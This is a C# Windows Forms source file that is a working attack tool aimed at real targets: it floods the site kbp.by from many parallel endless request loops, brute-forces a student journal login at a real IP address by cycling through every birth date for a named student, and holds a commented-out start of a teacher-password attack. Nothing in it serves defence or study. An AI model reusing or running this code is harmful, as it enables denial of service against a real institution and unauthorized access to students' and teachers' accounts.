using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Web;
using System.IO;
using System.Diagnostics;

namespace KBP
{
    public partial class Form1 : Form
    {
        
        public Form1()
        {

            InitializeComponent();

        }
        Task[] tasks;
        //bool flag = false;

        private void button1_Click(object sender, EventArgs e)
        {
            textBoxInfo.Clear();
            //Thread stud = new Thread(Brute);
            //stud.IsBackground = true;
            //stud.Start();
            tasks = new Task[Convert.ToInt32(numericUpDown1.Value)];
            for (int i = 0; i < tasks.Length; i++)
            {
                tasks[i] = Task.Factory.StartNew(WeClose);
            }
        }

        public void WeClose()
        {
            button1.Invoke(new Action(() => button1.Enabled = false));
            numericUpDown1.Invoke(new Action(() => numericUpDown1.Enabled = false));
            while (true)
            {
                var request = (HttpWebRequest)WebRequest.Create("http://kbp.by/");
                var response = (HttpWebResponse)request.GetResponse();

                var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();

                if (responseString.Contains("Мы всегда рядом с Вами:"))
                {
                    textBoxInfo.Invoke(new Action(() => textBoxInfo.Text += "Мы всегда рядом с Вами:"));
                }
            }
        }

        public void Brute()
        {
            button1.Invoke(new Action(() => button1.Enabled = false));
            int badCounter = 0;
            for (int year = int.Parse(textBoxYearsFrome.Text); year <= int.Parse(textBoxYearsTo.Text); year++)
            {
                for (int moun = 1; moun <= 12; moun++)
                {
                    for (int day = 1; day <= 31; day++)
                    {
                        var request = (HttpWebRequest)WebRequest.Create("http://217.21.36.125/ej2/index.php");
                        var postData = "student_name=" + HttpUtility.UrlEncode(textBoxFIO.Text).ToUpper() + "&group_id=" + textBoxGroup.Text + "&birth_day=" + day.ToString().PadLeft(2, '0') + "." + moun.ToString().PadLeft(2, '0') + "." + year.ToString();
                        //textBox1.Text += postData + Environment.NewLine;
                        var data = Encoding.ASCII.GetBytes(postData);
                        request.Method = "POST";
                        request.ContentType = "application/x-www-form-urlencoded";
                        request.ContentLength = data.Length;
                        request.UserAgent = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36";

                        using (var stream = request.GetRequestStream())
                        {
                            stream.Write(data, 0, data.Length);
                        }
                        var response = (HttpWebResponse)request.GetResponse();

                        var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();

                        if (!responseString.Contains("Неверный данные!"))
                        {
                            textBoxInfo.Invoke(new Action(() => textBoxInfo.Text = day.ToString().PadLeft(2, '0') + "." + moun.ToString().PadLeft(2, '0') + "." + year.ToString()));
                            button1.Invoke(new Action(() => button1.Enabled = true));
                            return;

                        }
                        else
                        {
                            badCounter++;
                            label7.Invoke(new Action(() => label7.Text = badCounter.ToString()));
                        }
                    }
                }
            }
            textBoxInfo.Invoke(new Action(() => textBoxInfo.Text = "Не найдено!"));
            button1.Invoke(new Action(() => button1.Enabled = true));

        }

        private void button2_Click(object sender, EventArgs e)
        {
            button2.Text = "Не работает";
            button2.Enabled = false;
            return;
            textBoxInfo.Clear();
            Thread teach = new Thread(Brute);
            teach.IsBackground = true;
            teach.Start();
        }

        private void buttonStop_Click(object sender, EventArgs e)
        {
            return;
            textBoxInfo.Text += "Ожидание";
            try
            {
                Task.WaitAll(tasks);
            }
            catch { textBoxInfo.Text += "Not runing!"; }
            textBoxInfo.Text += "Завершение";
        }

        /*   public IList<T> RandomShuffle<T>(this IEnumerable<T> list)
           {
               var random = new Random();
               var shuffle = new List<T>(list);
               for (var i = 2; i < shuffle.Count; ++i)
               {
                   var temp = shuffle[i];
                   var nextRandom = random.Next(i - 1);
                   shuffle[i] = shuffle[nextRandom];
                   shuffle[nextRandom] = temp;
               }
               return shuffle;
           }

           public void BruteTeach()
           {
               button2.Invoke(new Action(() => button2.Enabled = false));
               int count = 0;
               var request = (HttpWebRequest)WebRequest.Create("http://217.21.36.125/ej2/t.php");
               var postData = "login=" + HttpUtility.UrlEncode(textBoxFIO.Text).ToUpper() + "&password=";
               //textBox1.Text += postData + Environment.NewLine;
               var data = Encoding.ASCII.GetBytes(postData);
               request.Method = "POST";
               request.ContentType = "application/x-www-form-urlencoded";
               request.ContentLength = data.Length;
               request.UserAgent = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36";

               using (var stream = request.GetRequestStream())
               {
                   stream.Write(data, 0, data.Length);
               }
               var response = (HttpWebResponse)request.GetResponse();

               var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();

               if (!responseString.Contains("Введён неправильный пароль!"))
               {
                   textBoxInfo.Invoke(new Action(() => textBoxInfo.Text = ""));
                   button2.Invoke(new Action(() => button2.Enabled = true));
                   return;

               }
               else
               {
                   count++;
                   label7.Invoke(new Action(() => label7.Text = count.ToString()));

               }
               textBoxInfo.Invoke(new Action(() => textBoxInfo.Text = "Не найдено!"));
               button2.Invoke(new Action(() => button2.Enabled = true));
           }*/
    }
}
